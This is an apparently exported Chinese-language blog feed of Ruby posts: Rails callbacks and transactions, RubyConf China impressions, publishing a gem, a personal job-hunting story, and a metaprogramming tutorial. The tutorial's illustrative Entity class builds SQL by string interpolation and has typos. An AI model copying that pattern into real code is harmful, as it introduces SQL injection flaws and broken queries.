  before_save <span class="token symbol">:update_username</span><span class="token punctuation">,</span><span class="token symbol">unless</span><span class="token symbol">:proc</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>user<span class="token operator">|</span> user<span class="token punctuation">.</span>evil<span class="token operator">?</span><span class="token punctuation">&#125;</span>
  <span class="token comment">#or</span>
  before_save <span class="token symbol">:update_username</span><span class="token punctuation">,</span><span class="token symbol">if</span><span class="token symbol">:proc</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>user<span class="token operator">|</span> <span class="token operator">!</span>user<span class="token punctuation">.</span>evil<span class="token operator">?</span><span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Rails-事务"><a href="#Rails-事务" class="headerlink" title="Rails 事务"></a>Rails 事务</h2><p>​    在Rails中对事务的支持，自动将模型的<code>save,destory,回调</code>封装到一个事务中</p>
<blockquote>
<p>如何操作？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># will trigger rollback</span>
<span class="token comment"># 这里Blog可以是类，或者是一个实例对象，都可以操作事务</span>
Blog<span class="token punctuation">.</span>transaction <span class="token keyword">do</span>
  <span class="token comment"># save！如果失败，都会爆出异常</span>
  blog<span class="token punctuation">.</span>save<span class="token operator">!</span>
<span class="token keyword">end</span>
<span class="token comment"># will also trigger rollback</span>
Blog<span class="token punctuation">.</span>transaction <span class="token keyword">do</span>
  <span class="token comment">#...  主动抛出异常</span>
  <span class="token keyword">raise</span> <span class="token string-literal"><span class="token string">'error'</span></span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
      <tags>
        <tag>Rails</tag>
      </tags>
  </entry>
  <entry>
    <title>RubyConf China所想</title>
    <url>//post/Ruby/RubyConfChina%20%E6%89%80%E6%83%B3.html</url>
    <content><![CDATA[<p>时隔三年<code>Ruby China大会</code>在上海再次举行，也趁着这个机会去上海逛了两天，收获许多。</p>
<p>Ruby在如今中国已经是一个非常小众的语言了，大家都在争先恐后的学习：</p>
<ol>
<li>Java</li>
<li>Go</li>
<li>Python</li>
</ol>
<p>我能想到的原因就是大部分的公司在用这些语言，大部分人在用这些语言，如果这时候你选择学习一门小众且岗位极少的语言，也就意味着你在偏离<code>&quot;主流&quot;</code>，在浪费时间。当你进入一家使用小众语言的公司，你也会担心这是否会影响今后长远的发展。而当你顺应追随<code>&quot;主流&quot;</code>时，你会想我选择了一个最保险的选择，公司都在招聘它。而当所有人都这么想时，主流中便涌入大量的人力，尤其是在中国。而数量的上升，与岗位的减少，让大家只能提高自己的质量，或想想其他出路。</p>
<p>而主流的人越多，支流的人也就越少，小众语言的公司负责人也会因为招人难而担心后续的发展，进而选择技术转型，甚至是在最初决策时，就转向使用人数最多的语言，而不是最适合场景的语言。这也就导致了一个恶性循环，最终主流上的人更多，支流上的人更少。</p>
<p>在我最初学习Ruby时，是因为看了《码农翻身》《程序员修炼之道》时，作者都在提及这个优雅的语言，让程序员快乐的语言，这个形容是有趣的，于是开始看Ruby元编程，而它带给我的就是灵活，简洁，看起来就想魔法一样的操作，我甚至不知道该怎么去驾驭它，这让人觉得沮丧，也让我看到了编程的世界远比我想象的更加广阔。</p>
<p>这次大会包含了多个话题：AST，性能压测，应用安全，DDD，AI，实战开发，Rust提速，SaaS等等。鼓舞每一个热爱这门语言的人，Ruby也在不断成长，虽然小众，但它仍然是一个红宝石，闪耀着光芒。</p>
<p>其实不论是哪个语言圈子，都会有工作不好找的声音，这本身也不能怪罪到语言身上，毕竟没有一门技术是永远吃的开的，每个语言都有自己的边界，而当你手上只有一把锤子时，你看什么都像是钉子。所以把自己的思维眼界放宽，拥抱变化，不断学习才是保证未来的唯一道路。</p>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
      <tags>
        <tag>Ruby</tag>
      </tags>
  </entry>
  <entry>
    <title>发布自己的GEM</title>
    <url>//post/Ruby/%E5%8F%91%E5%B8%83%E8%87%AA%E5%B7%B1%E7%9A%84GEM.html</url>
    <content><![CDATA[<h2 id="生成基础文件结构"><a href="#生成基础文件结构" class="headerlink" title="生成基础文件结构"></a>生成基础文件结构</h2><p><code>bundler gem your_gem</code>创建一个基础文件结构<br>第一次使用时，需要配置一些默认值:</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Creating gem <span class="token string">'demo_gem'</span><span class="token punctuation">..</span>.
Do you want to generate tests with your gem?
Future <span class="token variable"><span class="token variable">`</span>bundle gem<span class="token variable">`</span></span> calls will use your choice. This setting can be changed anytime with <span class="token variable"><span class="token variable">`</span>bundle config gem.test<span class="token variable">`</span></span><span class="token builtin class-name">.</span>
Enter a <span class="token builtin class-name">test</span> framework. rspec/minitest/test-unit/<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="CI"><a href="#CI" class="headerlink" title="CI"></a>CI</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Do you want to <span class="token builtin class-name">set</span> up continuous integration <span class="token keyword">for</span> your gem? Supported services:
* CircleCI:       https://circleci.com/
* GitHub Actions: https://github.com/features/actions
* GitLab CI:      https://docs.gitlab.com/ee/ci/

Future <span class="token variable"><span class="token variable">`</span>bundle gem<span class="token variable">`</span></span> calls will use your choice. This setting can be changed anytime with <span class="token variable"><span class="token variable">`</span>bundle config gem.ci<span class="token variable">`</span></span><span class="token builtin class-name">.</span>
Enter a CI service. github/gitlab/circle/<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="MIT-license"><a href="#MIT-license" class="headerlink" title="MIT license"></a>MIT license</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Do you want to license your code permissively under the MIT license?
This means that any other developer or company will be legally allowed to use your code <span class="token keyword">for</span> <span class="token function">free</span> as long as they admit you created it. You can <span class="token builtin class-name">read</span> <span class="token function">more</span> about the MIT license at https://choosealicense.com/licenses/mit. y/<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="代码准则"><a href="#代码准则" class="headerlink" title="代码准则"></a>代码准则</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">Do you want to <span class="token keyword">include</span> a code of conduct <span class="token keyword">in</span> gems you generate<span class="token operator">?</span>
Codes of conduct can increase contributions to your project by contributors who prefer collaborative<span class="token punctuation">,</span> safe spaces<span class="token punctuation">.</span> You can read more about the code of conduct at contributor<span class="token operator">-</span>covenant<span class="token punctuation">.</span>org<span class="token punctuation">.</span> Having a code of conduct means agreeing to the responsibility of enforcing it<span class="token punctuation">,</span> so be sure that you are prepared to <span class="token keyword">do</span> that<span class="token punctuation">.</span> Be sure that your email address is specified as a contact <span class="token keyword">in</span> the generated code of conduct so that people know who to contact <span class="token keyword">in</span> <span class="token keyword">case</span> of a violation<span class="token punctuation">.</span> For suggestions about how to enforce codes of conduct<span class="token punctuation">,</span> see https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>bit<span class="token punctuation">.</span>ly<span class="token operator">/</span>coc<span class="token operator">-</span>enforcement<span class="token punctuation">.</span> y<span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Do you want to include a changelog?
A changelog is a <span class="token function">file</span> <span class="token function">which</span> contains a curated, chronologically ordered list of notable changes <span class="token keyword">for</span> each version of a project. To <span class="token function">make</span> it easier <span class="token keyword">for</span> <span class="token function">users</span> and contributors to see precisely what notable changes have been made between each release <span class="token punctuation">(</span>or version<span class="token punctuation">)</span> of the project. Whether consumers or developers, the end <span class="token function">users</span> of software are human beings <span class="token function">who</span> care about what's <span class="token keyword">in</span> the software. When the software changes, people want to know why and how. see https://keepachangelog.com y/<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Do you want to <span class="token function">add</span> a code linter and formatter to your gem? Supported Linters:
* RuboCop:       https://rubocop.org
* Standard:      https://github.com/testdouble/standard

Future <span class="token variable"><span class="token variable">`</span>bundle gem<span class="token variable">`</span></span> calls will use your choice. This setting can be changed anytime with <span class="token variable"><span class="token variable">`</span>bundle config gem.linter<span class="token variable">`</span></span><span class="token builtin class-name">.</span>
Enter a linter. rubocop/standard/<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>以上的配置都不是必备的，如果后面想修改配置，也可以通过<code>bundle config gem.对应的配置名(上面的每个代码块儿都有写)</code>从新配置。<br>比如通过：<code>bundle config gem.test</code>就能找到所有的配置信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RubymineProjects: bundle config gem.test
Settings <span class="token keyword">for</span> <span class="token variable"><span class="token variable">`</span>gem.test<span class="token variable">`</span></span> <span class="token keyword">in</span> order of priority. The <span class="token function">top</span> value will be used
Set <span class="token keyword">for</span> the current user <span class="token punctuation">(</span>/Users/qinsicheng/.bundle/config<span class="token punctuation">)</span>: <span class="token string">"minitest"</span>
RubymineProjects: <span class="token function">cat</span> /Users/qinsicheng/.bundle/config
---
BUNDLE_GEM__TEST: <span class="token string">"minitest"</span>
BUNDLE_GEM__CI: <span class="token string">"false"</span>
BUNDLE_GEM__MIT: <span class="token string">"true"</span>
BUNDLE_GEM__COC: <span class="token string">"false"</span>
BUNDLE_GEM__CHANGELOG: <span class="token string">"true"</span>
BUNDLE_GEM__LINTER: <span class="token string">"false"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">demo_gem/
├── CHANGELOG.md
├── Gemfile
├── LICENSE.txt
├── README.md
├── Rakefile
├── bin 
│   ├── console
│   └── setup
├── demo_gem.gemspec                 这里是重点：设置gem的配置和描述信息
├── lib                              这里是重点：存放gem的核心功能
│   ├── demo_gem
│   │   └── version.rb
│   └── demo_gem.rb
├── sig
│   └── demo_gem.rbs
└── <span class="token builtin class-name">test</span>
    ├── test_demo_gem.rb
    └── test_helper.rb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><ol>
<li><code>rake build</code></li>
<li><code>rake install</code></li>
</ol>
<p>当执行完成后，就可以通过irb进行测试使用</p>
<h2 id="发布到rubygems"><a href="#发布到rubygems" class="headerlink" title="发布到rubygems"></a>发布到rubygems</h2><blockquote>
<p>这一步需要先到rubygems注册账号，并在gem发布前推送的github</p>
</blockquote>
<p><code>rake release</code></p>
<h2 id="简单配置发布"><a href="#简单配置发布" class="headerlink" title="简单配置发布"></a>简单配置发布</h2><p>上面的步骤一大堆，对现已经写好的项目转gem并不方面，我们只需要提取核心部分进行改造即可</p>
<ol>
<li><p>创建 your_gem_name.gemspec 文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># your_gem_name.gemspec</span>

Gem::Specification.new <span class="token keyword">do</span> <span class="token operator">|</span>spec<span class="token operator">|</span>
  spec.name          <span class="token operator">=</span> <span class="token string">"your_gem_name"</span>
  spec.version       <span class="token operator">=</span> <span class="token string">"0.1.0"</span>
  spec.authors       <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Your Name"</span><span class="token punctuation">]</span>
  spec.email         <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"your_email@example.com"</span><span class="token punctuation">]</span>
  spec.summary       <span class="token operator">=</span> <span class="token string">"A short description of your gem"</span>
  spec.description   <span class="token operator">=</span> <span class="token string">"A longer description of your gem"</span>

  spec.files         <span class="token operator">=</span> Dir<span class="token punctuation">[</span><span class="token string">"lib/**/*.rb"</span><span class="token punctuation">]</span>
  spec.bindir        <span class="token operator">=</span> <span class="token string">"bin"</span>
  spec.executables   <span class="token operator">=</span> spec.files.grep<span class="token punctuation">(</span>%r<span class="token punctuation">&#123;</span>^bin/<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token operator">|</span>f<span class="token operator">|</span> File.basename<span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
  spec.require_paths <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"lib"</span><span class="token punctuation">]</span>

  spec.homepage      <span class="token operator">=</span> <span class="token string">"https://github.com/your_username/your_gem_name"</span>
  
  <span class="token comment"># 添加你的依赖项</span>
  spec.add_dependency <span class="token string">"gem_dependency"</span>, <span class="token string">"~> 1.0"</span>
end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在文件中，你需要设置 gem 的基本信息，比如名称、版本号、作者、描述等。也可以添加 gem 依赖项，以确保用户在安装你的 gem 时会同时安装所需的其他 gem。请根据你的项目进行相应的修改。</p>
</li>
<li><p>构建 gem 包：使用以下命令来构建 gem 包：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gem build your_gem_name.gemspec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这将在当前目录下生成一个 .gem 文件，其文件名与你在 gemspec 文件中定义的 gem 名称和版本号相匹配。</p>
</li>
<li><p>发布 gem 包：如果你希望将 gem 发布到 RubyGems.org 或其他 gem 托管服务上，可以使用以下命令发布你的 gem 包：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gem push your_gem_name-0.1.0.gem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>发布 gem 包需要一个 RubyGems.org 的账号，如果你没有账号，可以使用 gem register 命令来注册一个。</p>
</li>
<li><p>安装和使用 gem：其他人可以使用以下命令安装并使用你的 gem：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gem <span class="token function">install</span> your_gem_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p>这里我发布了一个正则包装器（玩具）的gem：<a href="https://rubygems.org/search?query=ruby_regexp_wrapper">search | RubyGems.org | your community gem host</a>，如果你发布成功，应该也可以搜索到自己的gem。</p>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
      <tags>
        <tag>rubyGem</tag>
      </tags>
  </entry>
  <entry>
    <title>勇闯SAP失败，勇敢转行成功</title>
    <url>//post/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/sap.html</url>
    <content><![CDATA[<p>晚上看到Y总的<strong>勇闯腾讯</strong>的经历，脑袋一热，往日的经历让我的肾上腺素好像又高了。</p>
<p>我是物流专业，大三的时候，学校请的SAP培训机构来给我们上课，讲关于SAP在供应链上的应用。当时对这个外企很好奇，并且那时候刚会点儿python，正在学韩顺平的Java基础，刚好家旁边就是SAP西安分部，脑袋一热就跑公司楼下问招人吗，也没看boss直聘，到人楼下了，心里怂了，想着自己啥都不会，技术，英语，学历都不行，想还是算了吧，但又觉得既然来了，总得试试吧。</p>
<p>看着一个个员工出来，我愣是一个没敢上去打招呼，刚想抬手，又放下去了，发现有人用异样的眼光看我，让我更不敢上前询问了，最后坐到楼道里深呼吸，让自己放松。时间不等人，出来的员工越来越少，眼看着再不上去，今天就算白来了，等最后剩一个姐姐走门口了，我才鼓起勇气跑过去询问，她也很热情，说可以关注SAP招聘公众号，不过委婉的说基本都是研究生，除非你很优秀。我就连忙道谢，心里特别的开心，就好像已经找到工作了一样😂，之后我就在知乎上查找相关信息，并联系上一个SAP大连分公司研究生刚入职的学生，向他请教，怎么学才能有机会进去呢，人家听我是二本的物流学生，仍鼓励我可以试试，现在想想当时是天真了。但那会儿就是兴奋，觉得有机会的，然后就参与SAP的秋招会，SAP的春招会。还收到了SAP公司送的礼物，当有一天短信通知我，简历初次筛选了，心里更是兴奋，但之后就再没后续了。。。</p>
<p>后面经历了秋招的残酷，也认清现实，心里也是焦虑，经常在想自己走这条路真的能行吗，算法，模式，分布式，缓存，源码学习，前端，项目，觉得需要的我都去学，甚至无奈的想去尝试 Ruby这种更小众的语言。就好像又到了SAP楼下，是鼓起勇气去请教与询问，还是摆摆手说，算了我这样的肯定没希望，然后回家。</p>
<p>庆幸的是我坚持下来了，并且找到一份现在很满意的开发工作。虽然是一个小创业公司，不过同事间氛围很好，我也很快负责了核心业务。大厂，外企的梦我依然在，当更实际的是沉下心提升自己。下面引用两个著名航海家的名言：</p>
<p><strong>罗杰：每个人都有自己出场的机会</strong></p>
<p><strong>黑胡子：人的梦想是不会结束的</strong></p>
]]></content>
      <categories>
        <category>个人经历</category>
      </categories>
  </entry>
  <entry>
    <title>Ruby元编程</title>
    <url>//post/Ruby/Ruby%E5%85%83%E7%BC%96%E7%A8%8B.html</url>
    <content><![CDATA[<pre><code>本文需要在了解Ruby基本语法的前提下，进行学习
</code></pre>
<h2 id="元编程是什么？"><a href="#元编程是什么？" class="headerlink" title="元编程是什么？"></a>元编程是什么？</h2><p>​    元编程是编写能在运行时操作语言构件的代码</p>
<p>​    在我们使用编辑器编写代码后，代码按照我们所写的内容进行编译，运行。在启动后我们无权再对代码进行干涉，而在一些业务场景中，我们想在不修改源代码的前提下，对一个类进行增强，这在Java中也是一个成熟的技术，例如反射，动态代理。但是Java所能给予的操作相比Ruby，就显得格外的严格且复杂。</p>
<p>​    Ruby是一门可以在运行时操作语言构建的工具。语言构建就是我们代码中的各个成员（对象，类，模块儿，实例变量等）。通俗来说可以使用Ruby在运行时对已有的类进行灵活的修改，例如修改一个方法的定义。实例变量的定义，甚至我们可以在运行时创建一个没有的类。下面我们使用一些伪代码来进行演示。</p>
<p>​    我们想对数据库进行操作，最初我们的想法就是写一个Entity基类，然后由子类继承</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Entity</span>
  <span class="token comment"># 提供访问器</span>
	attr_accessor <span class="token symbol">:table</span><span class="token punctuation">,</span><span class="token symbol">:id</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span> table<span class="token punctuation">,</span>id
		<span class="token variable">@table</span> <span class="token operator">=</span> table
		<span class="token variable">@id</span> <span class="token operator">=</span> id
		Database<span class="token punctuation">.</span>sql <span class="token string-literal"><span class="token string">"insert into </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@able</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> 'id' values </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@id</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">&#125;"</span></span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set</span></span><span class="token punctuation">(</span>col<span class="token punctuation">,</span>val<span class="token punctuation">)</span>
		Database<span class="token punctuation">.</span>sql <span class="token string-literal"><span class="token string">"update </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@table</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> set </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">col</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">val</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> where id = </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@id</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get</span></span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>
		Database<span class="token punctuation">.</span>sql <span class="token string-literal"><span class="token string">"select </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">col</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@table</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> where id = </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@id</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Movie</span> <span class="token operator">&lt;</span> Entity
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span> id
		<span class="token keyword">super</span> <span class="token string-literal"><span class="token string">'movies'</span></span><span class="token punctuation">,</span>id
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">title</span></span>
		get <span class="token string-literal"><span class="token string">"title"</span></span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">title</span></span><span class="token operator">=</span> value
		set <span class="token string-literal"><span class="token string">"title"</span></span><span class="token punctuation">,</span>value
	<span class="token keyword">end</span>
  
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">article</span></span>
		get <span class="token string-literal"><span class="token string">"article"</span></span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">article</span></span><span class="token operator">=</span> value
		set <span class="token string-literal"><span class="token string">"article"</span></span><span class="token punctuation">,</span>value
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># --------------------------------</span>
<span class="token comment"># 插入一条数据，简单且方便</span>
movie <span class="token operator">=</span> <span class="token class-name">Movie</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
movie<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"猫捉老鼠"</span></span>
movie<span class="token punctuation">.</span>article <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"相当不错"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    上面的代码看起来是可以解决问题，但如果一张表的字段特别多，我都需要定义到Movie类中吗？能不能用更少的代码解决问题？我们使用<code>Active Record</code>类库操作：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Movie</span> <span class="token operator">&lt;</span> ActiveRecord<span class="token double-colon punctuation">::</span>Base
<span class="token keyword">end</span>
<span class="token comment"># --------------------------------</span>
<span class="token comment"># 插入一条数据，简单且方便</span>
movie <span class="token operator">=</span> <span class="token class-name">Movie</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
movie<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"猫捉老鼠"</span></span>
movie<span class="token punctuation">.</span>article <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"相当不错"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们看到这次在Movie继承<code>ActiveRecord::Base</code>后，没有指定是哪个数据表，没有写SQL，没有定义像上面一样的操作方法，我们就可以轻松插入数据。这底层到底是干了什么？</p>
<p>​    实际上是ActiveRecord在运行期，通过内省机制查看类的名字，通过Movies推断出表名为<code>movies</code>,并在在读取数据表时，发现有title,article两个字段，动态的定义了两个同名的属性和相应的访问器。也是就动态的生成了 <code>Movie#title 和 Movie#title=</code> 这样的方法。</p>
<p>​    这就是Ruby的特点，也是我们要学习的元编程的一种表现形式，我们后面将试着分析和学习它。</p>
<h2 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h2><p>​    现在我们有一个需求，将给定的字符串，添加一个后缀，我们可以定义一个函数</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">appendTxt</span></span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> 
	content <span class="token operator">=</span> content <span class="token operator">+</span> <span class="token string-literal"><span class="token string">".txt"</span></span>
<span class="token keyword">end</span>

p appendTxt <span class="token string-literal"><span class="token string">"alibaba"</span></span>  <span class="token comment"># => "alibaba.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    但这不填符合我们面向对象的方法，应该将这个函数封装到一个具体类中，定义它的职责。如果我们因此封装一个<code>ApendTxtString</code>类，会不会导致类太多了，能不能让原本Ruby中的String具有新的行为,答案是可以的。我们可以直接修改Ruby原先定义的标准类。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 这里相当于从新打开String的上下文，添加一个新的方法</span>
<span class="token keyword">class</span> <span class="token class-name">String</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">appendTxt</span></span>
		to_s <span class="token operator">+</span> <span class="token string-literal"><span class="token string">".txt"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span> 
<span class="token comment"># 我们使原先的String具有了新的行为</span>
p <span class="token string-literal"><span class="token string">"alibaba"</span></span><span class="token punctuation">.</span>appendTxt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    class更像是一个作用域操作符，当你第一次使用class时，会判断是否有这个类，如果没有进行创建，如果有则带回到类的上下文中，可以修改以往的方法，实例等等，这带给开发者很大的灵活性。</p>
<p>​    但如果使用不当，也会导致很大的问题，比如原本String拥有appendTxt方法，而很多地方都应用这个函数，而你一旦从新定义，就会导致全局的bug，而且不容易排查，所以使用前一定要检查是否有重名方法。这种简单粗暴的修改在Ruby中也称为：<code>猴子补丁：Monkeypatch</code>，后面我们也有一些其他办法来替代猴子补丁，如<code>细化（Refinement）</code>，来将发生bug的可能降到最低</p>
<h3 id="类的真相"><a href="#类的真相" class="headerlink" title="类的真相"></a>类的真相</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 我们定义了一个类</span>
<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
    <span class="token comment"># 定义实例变量</span>
		<span class="token variable">@v</span> <span class="token operator">=</span> <span class="token number">10</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># 创建实例</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
<span class="token comment"># 输出当前对象是哪个类的实例</span>
obj<span class="token punctuation">.</span><span class="token keyword">class</span>   <span class="token comment"># => MyClass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    如果可以用Ruby解释器查看obj对象内部，我们可以发现什么？ 内部只有一个@v实例变量，而且仅属于obj对象</p>
<h4 id="实例变量"><a href="#实例变量" class="headerlink" title="实例变量"></a>实例变量</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">obj<span class="token punctuation">.</span>my_method
p obj<span class="token punctuation">.</span>instance_variables <span class="token comment"># => [:@v]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>​    与Java不同，Ruby中对象所属类和对象的实例变量没有任何关系，当你赋值创建一个实例变量时，它就出现了，如果你不使用<code>obj.my_method</code>，这个对象就没有<code>@v</code>这个实例变量</p>
<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 查看实例拥有哪些方法，因为每个类实例都是继承了Object类，所以会继承很多的方法</span>
p obj<span class="token punctuation">.</span>methods
<span class="token comment"># 这里用正则筛选一下</span>
p obj<span class="token punctuation">.</span>methods<span class="token punctuation">.</span>grep<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/my/</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

